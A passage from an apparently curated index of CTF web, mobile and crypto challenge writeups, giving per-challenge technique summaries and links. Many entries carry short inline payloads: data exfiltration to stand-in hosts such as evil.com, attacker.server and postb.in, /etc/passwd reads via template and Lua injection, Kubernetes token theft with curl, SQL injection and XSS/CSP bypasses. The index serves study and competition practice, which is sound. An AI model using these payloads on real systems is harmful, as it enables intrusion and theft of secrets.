    https://github.com/eboda/34c3ctf/tree/master/extract0r

### urlstorage - 34c3-ctf-2017
    RPO and css seletor to bf admin token and retrieve flag
    https://l4w.io/2017/12/34c3-ctf-2017-urlstorage-writeup/

<!-- }}} -->
<!-- 2018 {{{ -->
</p></details><details><summary>2018</summary><p>

### cool storage service - insomnihack-teaser-2018
    css selector to exfil csrf then upload php webshell with .pht extension
    https://ctftime.org/task/5186
    https://gynvael.coldwind.pl/?lang=en&id=671 unintended solution used `php://filter/convert.iconv` to make flag pass getimagesize() as a image/vnd.wap.wbmp

### file vault - insomnihack-teaser-2018
    php unserialization via `ZipArchive->open()`
    can bypass hmac check of serialized cookie because `str_replace('../', './')` called before unserialization
    http://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault

### phuck - insomnihack-ctf-2018
    bypass php filter with ?is.admin%00=1
    https://tipi-hack.github.io/2018/03/25/insomni'hack-18-phuck.html

### pixeditor - insomnihack-ctf-2018
    bmp/php polyglot
    https://ctftime.org/writeup/9526

### tax aversion - nullcon-ctf-2018
    server-side parameter pollution
    `?year=2017'%26username%3ddowd%3b%23&username=m` -> mdowd
    https://ctftime.org/writeup/8743

### linked out - nuitduhack-quals-2018
    upload cv in yaml format, rce via LaTex injection
    `skype: BBBBBBBBBBBBBB}\skype{\input|"ls *"}%`
    https://tipi-hack.github.io/2018/04/01/quals-NDH-18-linked-out.html

### personal website - asis-ctf-2018
    mongodb injection
    https://ctftime.org/task/6024

### guest book - volga-ctf-quals-2018
    lua injection `?search="..(io.popen('cat\x20/etc/passwd','r'):read('*a')).."`

### corp monitoring - volga-ctf-quals-2018
    mysql client connect lfi

### lazy admin - volga-ctf-quals-2018
    open redirect to our js to exfil admin page
    bypass url check with `?redir=%20http://evil` or `?redir=//evil` or `Host: evil`
    cross domain requests allowed because phantomjs with `--web-security=false`

### idiot {action,camera} - plaid-ctf-2018
    js/wave polyglot
    ssrf via SNI or redirect to ftp:// URL with long username to cause truncation
    https://dttw.tech/posts/r1jswRaAG

### geckome - defcon-ctf-quals-2018
    browser fingerprint must match to get flag
    https://ctftime.org/writeup/10171

### excesss - sctf-2018
    challenge replaces alert() with prompt() so create iframe to restore it
    https://ctftime.org/writeup/10193

### bbs - google-ctf-quals-2018
    self xss via avatar as a valid png containing `eval(location.search.substr(113))`
    use Range: header to skip over headers
    https://ctftime.org/task/6243

### cat chat - google-ctf-quals-2018
    xss via css injection and exfil via css selector rules
    https://github.com/terjanq/google-ctf-writeups

### hacker movie club - csaw-ctf-2018
    web cache poisoning
    https://ctftime.org/task/6658

### berg's club - pwn2win-ctf-2018
    php unserialization rce with `file_exists("phar://evil.jpg")`
    use https://github.com/ambionics/phpggc to build a Monolog gadget chain
    https://balsn.tw/ctf_writeup/20181130-pwn2winctf/#berg%E2%80%99s-club

### one line php - hitcon-ctf-2018
    php rce through race and lfi
    fix our session filename via PHP_SESSION_UPLOAD_PROGRESS and PHPSESSID
    chain php filters to remove `upload_progress_` prefixing our payload
    http://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html
    https://ctftime.org/task/6896

### return of one line php - realworld-ctf-2018
    same but `session.upload_progress.enabled = Off`
    bruteforce temp filename, prevent autodeletion by segfaulting php 7.2
    https://ctftime.org/task/7318

### flaglab - realworld-ctf-2018
    gitlab ssrf CVE-2017-0916 + command injection via redis
    https://desc0n0cid0.blogspot.com/2019/01/chaining-2-low-impact-bugs-into-gitlab.html

### rmi - realworld-ctf-2018
    rce with RMI RegistryFilter bypasses, which was introduced in Java 8u121
    https://ctftime.org/writeup/12656

### printmd - realworld-ctf-2018
    ssrf in Nuxt.js by passing arbitrary Object to `axios()` via http parameter pollution
    axios does not support file:// but supports UNIX socket so exfil flag via `/var/run/docker.sock`
    https://blog.cal1.cn/post/RealWorldCTF%20PrintMD%20writeup

### ublog - hxp-ctf-2018
    css selector timing attack
    https://ctftime.org/writeup/12540

### filemanager - 35c3-ctf-2018
    xs search via xss auditor
    https://gist.github.com/l4wio/3a6e9a7aea5acd7a215cdc8a8558d176
    https://www.youtube.com/watch?v=HcrQy0C-hEA

### post - 35c3-ctf-2018
    nginx alias traversal, php unserialization using SoapClient dep to ssrf the miniProxy internal service
    mssql automatically converts full-width unicode chars to ascii: 0xEF 0xBC 0x84 -> '$'
    use `gopher:///` or 301 redirect to gopher to bypass http/https check
    https://ctftime.org/task/7409

### php - 35c3-ctf-2018
    php unserialization and need to cause exception in unserialize via syntax error because object destructors arent called on exceptions
    https://ctftime.org/writeup/12773

### l33t hoster - insomnihack-teaser-2019
    upload .htaccess/.wbmp polyglot, \x00 same as a comment line in .htaccess files
    then bypass disable_functions via putenv() LD_PRELOAD and mail() and code a solver to solve captcha
    https://chmodxxx.github.io/2019/01/21/Insomni'Hack-l33thoster-Writeup.html
    http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster
    or upload .htaccess/.xbm polyglot
    https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md

### phuck2 - insomnihack-teaser-2019
    php lfi, bypass `allow_url_include=0` with `data:,0f3..9/profile` because
    `file_get_contents('data:,0f3..9/profile')` returns `0f3..9/profile` but
    `include('data:,0f3..9/profile');` sources the `/data:,0f3..9/0f3..9/profile` file
    https://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-Phuck2/

<!-- }}} -->
<!-- 2019 {{{ -->
</p></details><details><summary>2019</summary><p>

### dom validator - angstrom-ctf-2019
    abusing xss auditor in filter mode to crash the DOMValidator.js script
    https://infosecwriteups.com/xss-auditor-the-protector-of-unprotected-f900a5e15b7b
    or run js without <script> or clobber `document.documentElement.remove()` with `<form><input id=remove>`
    https://ctftime.org/writeup/14915

### gianturl - angstrom-ctf-2019
    csrf using `<a` with `ping` to issue POST request -> `<a href="a" ping="/admin/changepass?password=<new pw>">clickme</a>`
    https://github.com/justcatthefish/ctf-writeups/tree/master/2019-04-25-Angstrom2019/web#gianturl

### bypasses everywhere - inshack-ctf-2019
    bypass xss auditor by splitting payload into 2 query params
    bypass script-src CSP with JSONP
    post a json payload with `<form method=post enctype=text/plain`
    https://github.com/InsecurityAsso/inshack-2019/blob/master/bypasses-everywhere/writeup.md
    or use 2 iframes to overwrite /admin with xss (no CSP on /admin)
    https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere
    or use data:text/html,base64,.. URI
    https://ctftime.org/writeup/15227 https://jbz.team/inshack2019/Bypasses_Everywhere

### potent quotables - plaid-ctf-2019
    HTTP/0.9 + cache + alphanumeric deflate = xss
    https://blog.pspaul.de/posts/plaidctf-2019-potent-quotables/

### wallbreaker - 0ctf-quals-2019
    find php fastcgi .sock via an open_basedir bypass or a blind glob regex
    bypass disable_function via LD_PRELOAD
    https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy

### shop - volga-ctf-quals-2019
    spring mvc mass assignment
    https://balsn.tw/ctf_writeup/20190329-volgactfqual/#shop

### rich project - codegate-preliminary-2019
    zip password encrypted with weak ZipCrypto algorithm rather than AES, crack using pkcrack or bkcrack
    https://github.com/hyperreality/ctf-writeups/blob/master/2019-codegate/README.md

### proton - codegate-preliminary-2019
    bruteforce Mongo objectid ID to find other posts
    prototype pollution with non-ascii 'a' in 'admin' to bypass check
    https://aadityapurani.com/2019/02/03/hackim-nullcon-ctf-2019-proton/

### blog - nullcon-hackim-ctf-2019
    runs nodeesi lib (Edge Side Include) get flag with `<esi:include src= >`
    https://eugenekolo.com/blog/nullcon-hackim-ctf-2019/#blog20solves

### mime checkr - nullcon-hackim-ctf-2019
    phar/jpeg polyglot with ssrf
    https://eugenekolo.com/blog/nullcon-hackim-ctf-2019/#mimecheckr4solves

### meet your doctor - hack-in-paris-2019
    graphql 101
    https://swisskyrepo.github.io/HIP19-MeetYourDoctor/
    https://jaimelightfoot.com/blog/  hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/

### hotel booking system - 0ctf-2019
    apache tapestry 5 allows access to .class files, rce via deserialization
    https://balsn.tw/ctf_writeup/20190608-0ctf_tctf2019finals/#tctf-hotel-booking-system

### ooops - defcon-ctf-quals-2019
    xss reflected in error page, sqlite sqli to retrieve flag, dns rebinding alt solution
    https://balsn.tw/ctf_writeup/20190513-defconctfqual/#ooops

### gogo powersql - hitcon-ctf-quals-2019
    goahead + cgi + libmysqlclient (goahead not vuln to CVE-2017-17562)
    make client connect to our mysql server to read /flag https://github.com/lcark/MysqlClientAttack
    or rce via the LIBMYSQL_PLUGINS= and LIBMYSQL_PLUGIN_DIR= env vars, with a 512-byte dir to truncate .so automatically appended by mysql
    then overwrite `math.random()` function in lua redis
    https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#gogo-powersql

### buggy .net - hitcon-ctf-quals-2019
    using .NET request validation to trigger the exception and bypass waf
    solve with `curl -X GET -d 'filename=..\..\FLAG.txt&o=<x'`
    https://ctftime.org/writeup/16802 https://github.com/orangetw/My-CTF-Web-Challenges#buggy-net

### bounty pl3ez - hitcon-ctf-quals-2019
    xss with `%E2%80%A8-->` to comment line after unicode newline
    https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#bounty-pl33z

### babycsp - csaw-ctf-2019
    xss bypass CSP using Google jsonp endpoint
    https://github.com/jacopotediosi/Writeups/tree/master/CTF/2019/CSAW-Quals-2019/Web-BabyCSP-50

### unagi - csaw-ctf-2019
    xxe bypass waf with `iconv -f UTF-8 -t UTF-16BE`
    https://ctftime.org/writeup/16461

### buyify - csaw-ctf-2019
    ssti in handlebars with prototype pollution to override the getter of the jwt signing key
    key becomes '[object Object]' and we can forge jwt
    https://github.com/terjanq/Flag-Capture/tree/master/CSAW%20CTF%20Qualification%20Round%202019/buyify
    https://github.com/perfectblue/ctf-writeups/blob/master/2019/csaw-ctf-2019-quals/Buyifi-500/solve.js

### hCorem - realworld-ctf-2019
    bypass csp `default-src 'self'` by including the vuln page again
    `/api.php/qwq?callback=<script src="/api.php/qwq?callback=alert(1)//"></script>`
    bypass XSS Auditor via little endian encoding UTF-16LE, prefix payload with a Byte Order Mark (BOM)
    https://ctftime.org/writeup/16642

### mission invisible - realworld-ctf-2019
    xss in attribute, use external style to trigger event handler provided by the css
    `<p style="animation-name:progress-bar-stripes" onanimationstart="alert(1)"></p>` from `bootstrap.min.css`
    https://github.com/pwning/public-writeup/tree/master/rwctf2019/mission_invisible

### php note - tokyo-western-ctf-2019
    leak hmac key using windows defender as a side channel
    https://saarsec.rocks/2019/09/04/twctf-phpnote.html

### paste-tastic - google-ctf-2019
    xss with no origin check in parent's postMessage handling code
    trigger xss auditor to remove CONFIG
    dom clobbering to redefine CONFIG
    top and inner iframes can communicate even middle iframe is different origin
    https://github.com/koczkatamas/gctf19/tree/master/pastetastic
    https://www.youtube.com/watch?v=2up8J9dErHI

### the lottery - confidence-ctf-teaser-2019
    race condition in go slices
    https://balsn.tw/ctf_writeup/20190317-confidencectf/#the-lottery

### web 50 - confidence-ctf-teaser-2019
    xss via svg or cache poisoning
    https://balsn.tw/ctf_writeup/20190317-confidencectf/#web-50

<!-- }}} -->
<!-- 2020 {{{ -->
</p></details><details><summary>2020</summary><p>

### defiltrate - insomnihack-teaser-2020
    java deserialisation with ysoserial and Runtime.exec trick to use redirections
    `sh -c $@|sh . echo echo 0 > /tmp/x; for m in $(grep -r INS /* 2>/dev/null); do echo $m.evil.com >> /tmp/x; done; dig -f /tmp/x`
    https://ctftime.org/writeup/17998

### inso file manager - insomnihack-teaser-2020
    forge a jwt/rsa256 token since we can upload our own pubkey as a jwk file and link it in the jwt header (jku field)
    https://sharkzwithlazers.pizza/posts/2020_02_filemanager_1/

### bobby - tghack-2020
    sqli in password change / update query
    https://nosecurity.blog/tghackCTF2020#bobby

### solar energy - nullcon-hackim-ctf-2020
    solr parameter injection, list and read files on file system to get flag
    https://ctftime.org/writeup/18451

### split second - nullcon-hackim-ctf-2020
    nodejs pug package command injection, encode payload in oct to bypass filter
    https://ctftime.org/writeup/18293

### lateral movement - nullcon-hackim-ctf-2020
    exploit aws ec2 creds with ssrf, privesc with https://github.com/RhinoSecurityLabs/pacu
    https://graneed.hatenablog.com/entry/2020/02/09/143415

### ghost - nullcon-hackim-ctf-2020
    http3
    https://graneed.hatenablog.com/entry/2020/02/09/143359

### renderer - codegate-preliminary-2020
    python2 urllib header injection `urlopen('http://x/y HTTP/1.1\r\nX: cve-2019-9740')`
    jinja2 ssti simple payload to dump env vars
    https://ctftime.org/writeup/18354

### cat web - confidence-ctf-teaser-2020
    xss json with \u0022 and file:/// (firefox-67 cve-2019-11730)
    report: `file:///app/templates/index.html?foo","content":["\u0022><script src=http://example.com:1338/xs.js></script>"],"status":"ok","bar":"`
    xs.js: `url='http://me.com/?'; fetch('file:///app/templates/flag.txt').then(r=>r.text()).then(t=>fetch(url+btoa(t)));`
    https://balsn.tw/ctf_writeup/20200314-confidencectf2020teaser/#temple-js-(unsolved)

### newsletter - volga-ctf-quals-2020
    symfony twig ssti arbitrary file read/write or rce
    rce with `email="{{['cat${IFS}/etc/passwd']|filter('system')}}"@your.domain`
    https://github.com/TeamGreyFang/CTF-Writeups/blob/master/VolgaCTF2020/Web-Newsletter/README.md
    https://ctftime.org/task/10857

### user center - volga-ctf-quals-2020
    xss on subdomain via avatar upload with MIME type `*/*`
    flag domain read from cookie so overwrite it with a path taking precedence
    `document.cookie = "api_server=test.nl\uc040callback\uc040\uc040q; domain=.volgactf-task.ru; path=/profile.html";`
    make `$.getJSON` issue JSONP request to us with `callback=?` in URL (app replaces non-printable with ?)
    https://ctftime.org/writeup/19269

### library - volga-ctf-quals-2020
    graphql sqli escape closing ' with login=\\ so we can inject via email
    `SELECT * FROM users WHERE login='\' OR email=' OR 1=1 -- '`
    https://spotless.tech/volgactf-2020-qualifier-Library.html

### netcorp - volga-ctf-quals-2010
    tomcat9 vuln to ghostcat via 8009/tcp -> arbitrary file read, or rce via avatar upload
    https://ctftime.org/task/10853

### volgactf archive - volga-ctf-quals-2020
    prssi, frame hijacking + dom clobbering
    https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html

### crossintheroof - midnightsun-ctf-quals-2020
    dom xss, bypass body onload with many %0a so that setTimeout happens first
    throw an error to escape try statement by declaring location after it's used
    and execute js inside catch with `?xss=alert(1);let location=6`
    https://ctftime.org/task/11104

### notes app - bytebandits-ctf-2020
    markdown2 `2.3.8` vuln to self-xss which can be exploited using 3 frames
    https://ctftime.org/task/11164

### yet another cat challenge - confidence-ctf-2020
    csp bypass with `<meta http-equiv="refresh" content="0;URL=http://vuln/theme?=xss`
    xss reads nonce with `document.querySelector(`script`).nonce` or `document.currentScript.nonce`
    then create a new <script> tag to fetch and exfil flag
    in updated version, nonce is removed with `document.scripts[0].remove()`
    trigger a securitypolicyviolation event to retrieve nonce
    https://balsn.tw/ctf_writeup/20200905-confidence2020ctffinals/

### haha jail - confidence-ctf-2020
    hhvm php sandbox, our source code cannot contain `shell_exec` but one possible bypass was
    `echo call_user_func("shell_\x65xec","cat \x2fvar\x2fwww\x2f*lag* 1>&2");`
    https://ctftime.org/task/12976

### animal crossing - de1ctf-2020
    waf bypass with `&data=;=%27||666//`
    `var data=''||{"valueOf":new "".constructor.constructor('return 2')}+1//'`
    then some js to make admin upload flag.png as an avatar
    https://www.chainnews.com/articles/390680624719.htm

### catalog - plaid-ctf-2020
    csp bypass with `<meta http-equiv="refresh" />`
    csrf a failed login to inject html in error message and redirect to flag page
    exfil flag via Scroll To Text Fragment (STTF) and image lazy-loading
    bypass user gesture requirement with uBlock Origin due to user activation always included
    https://dttw.tech/posts/B19RXWzYL

### mooz chat - plaid-ctf-2020
    command injection in `convert -comment 'from ip %s' ..` on avatar images via `X-Forwarded-For`
    leak jwt key to forge victim token
    webrtc + mitm dh
    https://github.com/koolkdev/ctf-writeups/tree/master/plaid2020/mooz-chat

### contrived web problem - plaid-ctf-2020
    ssrf and ftp client vuln to crlf in password, we can send commands to rabbitmq to exfil flag
    https://ctftime.org/task/11323

### calc - de1ctf-2020
    java spel reflection with `?c='x'.class.forName('java.lang.System').getProperties()`
    ```
    'x'.class.forName('java.nio.file.Paths').get('/flag').toFile().exists()
    'x'.class.forName('java.nio.file.Files').readAllLines('x'.class.forName('java.nio.file.Paths').get('/flag'))
    'x'.class.forName("java.lang.Ru"+"ntime").getMethods()[13].invoke(
    'x'.class.forName("java.lang.Ru"+"ntime").getMethods()[17].invoke(null),
    "curl https://postb.in/..")
    ```
    https://drive.google.com/file/d/1lzLa6el8UYTqKKhnegGpS4lN7Edl7EOo/view

### pooot - defcon-ctf-quals-2020
    register a service worker to exfil other requests issued by browser
    https://medium.com/@flohantk/pooot-writeup-217384a6b69c

### dogooos - defcon-ctf-quals-2020
    python `str.format` with user-controlled format string -> leak globals
    f-Strings using legacy `f()` instead of `f""`, implemented using eval() -> rce
    https://ctftime.org/writeup/20654

### uploooadit - defcon-ctf-quals-2020
    http desync attack CL.TE between haproxy and gunicorn
    https://ctftime.org/task/11590

### where is my cash - alles-ctf-2020
    xss in js var, no cache-control or max-age header, read cached response with `"cache":"force-cache"`
    and exfil first api key, ssrf in node-html-pdf + sqli in insert to leak final api key
    https://github.com/Super-Guesser/ctf/tree/master/ALLES%20CTF%202020/web/where_is_my_cash

### push - alles-ctf-2020
    http/2 server using HTTP Server Push, observe hidden requests using Chrome Net Export tool
    https://github.com/0x13A0F/CTF_Writeups/tree/master/alles_ctf

### onlyfreights - alles-ctf-2020
    node/express app vuln to javascript prototype pollution
    override shell and env to rce
    https://ctftime.org/task/12965

### watchers - pwn2win-ctf-2020
    reDoS attack to make wappalyzer time out so that `shell_exec` output is empty to leak url to our uploaded page
    xss due to insufficient regex for the AppDynamics package, bypass strict csp `default-src: none` with
    `<script src="cid:adrum.1<img/src=a onerror=eval(atob('..'))"></script>`, avoid url encoding with `cid:`
    https://ctftime.org/writeup/21015

### wechat generator - 0ctf-2020
    svg lfi with `<image href="text:/etc/passwd"/>`, xss bypass in an svg via `xlink:href` instead of `src`
    https://ctftime.org/task/12152

### easyphp & noeasyphp - 0ctf-2020
    php eval sandboxed with disable_functions and open_basedir set to /var/www/html
    bypass open_basedir with `foreach(new DirectoryIterator('glob:///*') as $f)`
    load flag.so ffi extension with `$ffi = FFI::load('/flag.h');` and get flag with
    `$a = $ffi->flag_fUn3t1on_fFi(); var_dump(FFI::string($a));`
    https://hxp.io/blog/74/0CTF-2020-writeups/

### webrtc - csaw-ctf-quals-2020
    abuse turn server to proxy commands to internal redis server -> rce
    https://ctftime.org/task/13011

### flask_caching - csaw-ctf-quals-2020
    uses pickle to serialize/deserialize data to/from redis
    https://ctftime.org/writeup/23360

### cookie clicker - downunder-ctf-2020
    webapp uses cloud firestore database, use the rest api to retrieve all documents and find flag
    https://github.com/joaofcmb/DownUnderCTF-writeups/tree/master/web/cookie-clicker

### design comp - downunder-ctf-2020
    leak csrf token via css attribute selectors `[name="csrf"][value^="a"] {background: url(http://attacker.server/Aa} }`
    however csrf input is hidden so use adjacent sibling node `[name="csrf"][value^="a"]~p{...}`
    https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/design-comp

### taking stock - downunder-ctf-2020
    upload malicious joblib serialized model as profile pic and load it via directory traversal -> rce
    https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/taking-stock

### fluxcloud frontline - hacklu-ctf-2020
    bypass firewall via SNI set to allowed host but vhost set to secret host
    bypass router via open redirect to open websocket connection to our client and access internal api
    https://ctftime.org/task/13501

### litter box - hacklu-ctf-2020
    xss with race condition postMessage/onmessage to bypass `e.source == window.frames[0]` with `null == undefined => true`
    https://krial057.github.io/blog/hack_lu_litter_box

### harmony chat - dragon-ctf-2020
    rce by sending serialized js in POST /csp-report, bypass localhost ip check via ftp active mode ssrf
    https://ctftime.org/writeup/25058

### scratchpad - dragon-ctf-2020
    error-based xs search to bypass strict csp
    https://ctftime.org/task/14022 https://blog.arxenix.dev/dragonctf-2020-scratchpad/

### http-for-pros - defcamp-ctf-2020
    ssti without `_` using `request[request.cookies['a']]` and `Cookie: "a": "__class__", ..`
    https://ctftime.org/writeup/25264

### more secure secrets - asis-ctf-finals-2020
    php file upload race to find tmp filename, bypass open_basedir with `glob('///')`
    bypass disable_functions by sending raw FastCGI packet to PHP-FPM tcp socket
    https://ctftime.org/task/14265

### resonator - hxp-ctf-2020
    php rce via SSRF with file_put_contents('ftp://...') to send FastCGI packet to PHP-FPM tcp socket
    https://ctftime.org/writeup/25660
    or maybe rce via phar deserialization with php filter chain but must clear log file with `\x10` first
    `write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode`
    https://www.ambionics.io/blog/laravel-debug-rce

### security scanner - hxp-ctf-2020
    memcached CRLF command injection within session ID via TLS Poison
    https://ctftime.org/task/14375

### notepad - zer0pts-ctf-2020
    flask ssti and pickle unserialize rce
    https://ctftime.org/task/10626

### can you guess it - zer0pts-ctf-2020
    php basename bypass when filename contains char > 0x7f `basename('/index.php/config.php/'.chr(128))` -> `config.php`
    https://hackmd.io/@st98/rkFnKLZrI https://st98.github.io/diary/posts/2020-03-09-zer0pts-ctf-2020.html#web-338-can-you-guess-it

<!-- }}} -->
<!-- 2021 {{{ -->
</p></details><details><summary>2021</summary><p>

### dbaasadge - realworld-ctf-2021
    postgres-10 with extensions dblink and mysql_fdw
    arbitray SQL as a NOSUPERUSER user yet granted all privileges on database `postgres`
    libmysqlclient-dev on ubuntu 18.04 has ENABLED_LOCAL_INFILE by default so we can read local files
    leak file path where postgres pw hash is stored via `select pg_relation_filepath('pg_authid')`
    and exfil file using postgres-10-mysql-fdw to connect to our server
    recover postgres pw since `hash:=md5(password+username)` and password is only 5 chars long
    run commands with `SELECT dblink('host=0 password=xxxxx','copy(select)to program''curl me/`/readflag`''')
    https://github.com/5lipper/ctf/blob/master/rwctf20-21/dbaasadge.md

### old system - realworld-ctf-2021
    java deserialization rce in Java 1.4
    https://github.com/voidfyoo/rwctf-2021-old-system/tree/main/writeup

### computeration - just-ctf-2021
    xss and REdos to leak flag from admin page by measuring execution time of the cross-origin frame
    include an img that never loads with https://deelay.me/10000/ to prevent bot from immediately closing
    https://ctftime.org/writeup/25869

### babycsp - just-ctf-2021
    xss and csp bypass by forcing php to flush its 4096-byte buffer before `header('Content-Security-Policy: ...');`
    https://ctftime.org/writeup/25867

### go-fs - just-ctf-2021
    go net/http FileServer bug when parsing Range header to bypass filter and read flag
    or unintended solution by using the CONNECT method
    https://ctftime.org/writeup/25852

### build a better panel - dice-ctf-2021
    prototype pollution without `__proto__` to overwrite iframe's srcdoc to csrf admin bot
    bypass csp with `<script src=/admin` or `<link rel=stylesheet href=/admin/`
    https://ctftime.org/task/14701

### web ide - dice-ctf-2021
    bypass javascript Proxy in iframe `sandbox.html` with `[].map.constructor`
    use `window.open` to retrieve cookie set to a subpath, chrome would block without user interaction but not headless
    or service workers (intended solution)
    https://ctftime.org/task/14699

### watermark as a service - dice-ctf-2021
    make bot visit deprecated v1beta1 api which does not require the `Metadata-Flavor: Google` header, bypass IP check with alt encoding or
    a 302 or meta refresh redirect to `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
    https://github.com/tlyrs7314/ctf-writeups/tree/main/DiceCTF2021/Watermark-as-a-Service
    https://ahmed-belkahla.me/post/dice_ctf_web_writeups/
    or scan for the devtools randomized port and read the Dockerfile with the devtools protocol
    view-source:https://cf43dffe.y7z.xyz/ec0ca6 https://discord.com/channels/805956008665022475/805962699246534677/808204024993284106

### localization is hard - aero-ctf-2021
    rce via Thymeleaf SpringEL, use `/bin/sh -c` because `/bin/bash` doesnt exist

### not received prize - aero-ctf-2021
    xss and bypass html sanitizer with `<scr<script>ipt>`
    bypass csp with JSONP `https://accounts.google.com/o/oauth2/revoke?callback=var b=0;alert(0)`
    solve maths operation and exfil big png using a canvas and `.toDataURL()`
    https://ctftime.org/task/14803

### simple blog - zer0pts-ctf-2021
    csp + trusted types preventing simple xss via JSONP callback parameter
    firefox does not yet support Trusted Types natively so polyfill is used
    disable Trusted Types in polyfill by making `window.trustedTypes` and `trustedTypes.defaultPolicy` truthy
    via DOM clobbering with `<form id="trustedTypes"><input id="defaultPolicy"></form>`
    use DOM clobbering again to define `window.callback` and bypass `strlen(callback) < 21` check by calling jsonp again
    with `<a href="abc:jsonp(x);//" id="callback"></a><a href="data:text/plain;base64,<exfil cookie>" id="x"></a>`
    https://hackmd.io/@st98/S1z9qV1X_
    https://github.com/aszx87410/ctf-writeups/issues/21

### pdf generator - zer0pts-ctf-2021
    custom javascript function vuln to prototype pollution without `__proto__`
    find a script gadget in Vue.js to get XSS
    read flag in the PDF from the DOM via Chrome's pdf_viewer using `postMessage` to select all text and then read the selected text
    https://blog.s1r1us.ninja/CTF/zer0ptsctf2021-challenges
    https://github.com/aszx87410/ctf-writeups/issues/23
    unintended 1: use fetch to read flag PDF with `<embed src=1 onload="fetch(`/text`).then(..exfil)`
    unintended 2: use fetch with `'cache': 'force-cache'` to bypass local IP check

### kantan calc - zer0pts-ctf-2021
    javascript code golf use `[...arguments[0]+0]` to bypass flag prefix match
    [...'abc']+'' converts String to Array and then to String again but comma separated: "a,b,c"
    or exfil char by char with `String(this)[char_index]}).bind(()=>{`
    https://hackmd.io/@st98/Sy7D5NymO

### workerbee - nahamcon-ctf-2021
    turn ssrf into lfi with `file:///etc/passwd#https://
    werkzeug in debug mode, read local files needed to recover console pin
    https://westar.medium.com/nahamcon-2021-ctf-workerbee-33fa6662bb24
    https://github.com/stephanos199/ctf-writeups/tree/main/NahamCon2021/Workerbee

### borg - nahamcon-ctf-2021
    drupal version 8.5.0 disclosed at `/core/install`
    vuln to CVE-2018-7600 "Drupalgeddon2" rce
    grab API token with `TOKEN=$(< /var/run/secrets/kubernetes.io/serviceaccount/token)` and fetch all the secrets from the API
    with `curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces/kube-system/secrets/ --header "Authorization: Bearer $TOKEN"`
    or privesc to root shell with `kubctl get pods; kubectl cluster-info; kubectl exec -it <pod name> /bin/sh`
    then find base64-encoded flag in `kubectl --token=$TOKEN get secrets --all-namespaces -o yaml`
    https://www.youtube.com/watch?v=rGsKqjqGqKg

### your note - union-ctf-2021
    xs search using `window.open` because puppeteer uses `--disable-popup-blocking`
    https://github.com/x-vespiary/writeup/blob/master/2021/03-line/web-your-note.md
    https://hackmd.io/@stypr233/linectf#Your-Note
    or ssrf the report bot to leak flag because server sends `ng` if the search query is a match
    headless chrome cannot handle download with `Content-disposition: attachment` and throws err
    https://gist.github.com/msrkp/0c18ba2d79a88b64982e51fe36464013

### double check - union-ctf-2021
    bypass nodejs `decodeURIComponent()` with `-d 'p=1&p=%ff/ＮＮ/ＮＮ/ＮＮ/flag' -H 'Content-Type: text/plain'`
    because by default `querystring.unescape` tries to use built-in `decodeURIComponent` and
    if it fails falls back to `unescapeBuffer` https://github.com/nodejs/node/blob/v15.8.0/lib/querystring.js#L126
    which uses Int8Array so it can be overflowed by using 'Ｎ' for example https://github.com/nodejs/node/blob/v15.8.0/lib/querystring.js#L115

### 3233 - union-ctf-2021
    websocket chat based on e2ee, sniff chatting room using socket.io client then perform padding oracle attack to recover flag
    https://hackmd.io/@stypr233/linectf

</p></details>
<!-- }}} -->
<!-- }}} -->

## mobile <!-- {{{ -->
<!-- 2013-2017 {{{ -->
<details><summary>2013-2017</summary><p>

### robot plans - hacklu-ctf-2013
    md5s of lock pattern for android (gesture hashes)
    https://thufirhowatt.wordpress.com/hack-lu-ctf-robot-plans-writeup/
    or like in ctfx-2016/iTrash find gesture.key and follow http://resources.infosecinstitute.com/android-forensics-cracking-the-pattern-lock-protection/

### state of the ART - 0ctf-2016
    reconstruct Dalvik bytecode from OAT binary
    http://reyammer.blogspot.com.au/2016/03/from-android-art-binary-only-to-dex-yes.html

### ill intentions - google-ctf-2016
    send broadcast intent to app, receive reply containing flag
    instead of reversing jni lib, send broadcast using adb and patch app
    https://github.com/dpox/ctfs/blob/master/googlectf2016/IllIntentions.md
    or write custom app to receive and log reply https://ctf.rip/googlectf-2016-ill-intentions-mobile-challenge/
    can also use Xposed hooks http://blog.squareroots.de/en/2016/05/google-ctf-2016-ill-intentions-mobile/

### little bobby - google-ctf-2016
    write apk to exploit blind sqli
    https://github.com/yohanes/write-ups/tree/master/google-ctf/mobile-little-bobby-application

### secr3tmgr lock - insomnihack-ctf-2017
    crack android lockscreen password from /data/system/password.key and device_policies.xml
    http://arishitz.net/writeup-secr3tmgr-forensic-insomnihack-2017/

</p></details>
<!-- }}} -->
<!-- }}} -->

## crypto <!-- {{{ -->
<!-- 2012-2014 {{{ -->
<details><summary>2012-2014</summary><p>

### poli-ctf-2012
    ECC / ECDLP on anomalous curve
    http://mslc.ctf.su/wp/polictf-2012-crypto-500/

### rsa - pico-ctf-2013
    p, q, e and c provided
    use gmpy2 to decrypt ciphertext
    https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rsa

### BREW'r'Y - hacklu-ctf-2013
    graphs hamilton
    http://mslc.ctf.su/wp/hack-lu-2013-ctf-crypto-350-brewry/

### ECKA - hacklu-ctf-2013
    elliptic curve key agreement and diffie-hellman key exchange
    https://stratum0.org/blog/posts/2013/10/26/hack-dot-lu-2013-ecka/

### fluxarchiv - hacklu-ctf-2013
    home-made archive with scrambled pw (part1)
    find rc4-encrypted flag (part2) one team recontructed the keystream by using 2 encrypted
    archives that have the same content

### geier's lambda - hacklu-ctf-2013
    xTea cipher
    easy to find a collision because cipher only used first 4 chars of the key

### maving is plain-Jane - hacklu-ctf-2013
    Menezes-Vanstone, elliptic curve
